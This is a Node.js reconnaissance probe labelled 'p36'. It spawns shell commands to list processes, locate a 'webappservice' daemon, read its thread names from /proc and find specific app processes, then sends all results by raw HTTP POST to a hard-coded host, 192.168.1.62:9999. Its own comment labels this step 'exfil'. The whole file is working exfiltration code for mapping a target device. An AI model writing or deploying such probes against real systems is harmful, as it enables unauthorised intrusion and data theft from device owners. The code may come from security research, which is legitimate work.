"use strict";
/* p36: process landscape via shell (async spawn, no event-loop blocking)
   - ps -ef / ps -eo
   - webappservice daemon: pid, thread count, thread names (appid?)
   - exfil /p36info
*/
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p36', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(60000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 120000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p36info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 20000;
  return new Promise(function (resolve) {
    if (!cp) { resolve('[no child_process]'); return; }
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 8000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 9000));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function seq(steps) {
  var i = 0;
  function next() {
    if (i >= steps.length) { postFinal(); return; }
    var s = steps[i++];
    s.fn().then(function (r) {
      R.results[s.name] = r;
      next();
    }).catch(function (e) {
      R.results[s.name] = '[exception ' + e + ']';
      next();
    });
  }
  next();
}

var steps = [
  { name: 'ps_ef', fn: function () { return run('ps -ef 2>&1 | head -250', 20000); } },
  { name: 'ps_eo', fn: function () { return run('ps -eo pid,ppid,user,comm,args 2>&1 | head -250', 20000); } },
  { name: 'wasd_find', fn: function () { return run('ps -ef 2>/dev/null | grep -i "webappservice" | grep -v grep', 15000); } },
  { name: 'wasd_threads', fn: function () {
      var pids = String(R.results.wasd_find || '').split('\n');
      var wasd = [];
      for (var i = 0; i < pids.length; i++) {
        var m = pids[i].match(/^\s*\S+\s+(\d+)/);
        if (m && pids[i].indexOf('webappservice') >= 0) wasd.push(m[1]);
      }
      if (!wasd.length) return Promise.resolve('no webappservice pid found');
      var pid = wasd[0];
      R.results.wasd_pid = pid;
      return run('echo "threads: $(ls /proc/' + pid + '/task 2>/dev/null | wc -l)"; echo ---; for t in /proc/' + pid + '/task/*; do echo "$(basename $t): $(cat $t/comm 2>/dev/null)"; done 2>/dev/null | head -150', 25000);
  }},
  { name: 'app_procs', fn: function () { return run('ps -ef 2>/dev/null | grep -i "apps_rw" | grep -v grep; echo ---; ps -ef 2>/dev/null | grep -i "FreshAppio" | grep -v grep', 20000); } },
  { name: 'proc_count', fn: function () { return run('ls -d /proc/[0-9]* 2>/dev/null | wc -l', 10000); } }
];

seq(steps);

setTimeout(function () { R.results.guard = 'global timeout'; postFinal(); }, 150000);
